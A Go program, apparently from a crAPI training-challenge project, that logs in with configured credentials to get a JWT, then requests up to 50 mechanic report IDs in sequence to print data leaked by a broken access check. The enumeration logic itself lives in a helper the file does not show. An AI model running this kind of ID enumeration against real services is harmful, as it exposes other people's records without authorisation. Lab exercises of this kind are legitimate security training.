package main

import (
	"fmt"
	"log"

	configurator "github.com/tomek-skrond/crapiconfigurator/v2"
)

func main() {
	// read config
	config, err := configurator.GetConfig("../challenge-automation/config.yaml")
	if err != nil {
		log.Fatalln(err)
	}

	loginurl := fmt.Sprintf("%s%s", config.Hostname, config.LoginURL)
	token := configurator.GetJWTToken(loginurl, config.Email, config.Password)

	url := fmt.Sprintf("%s%s", config.Hostname, config.TargetURL)

	// check N report IDs
	fmt.Println("Mechanic reports leaked data:")
	GetAllReportsByID(50, token, url)
}
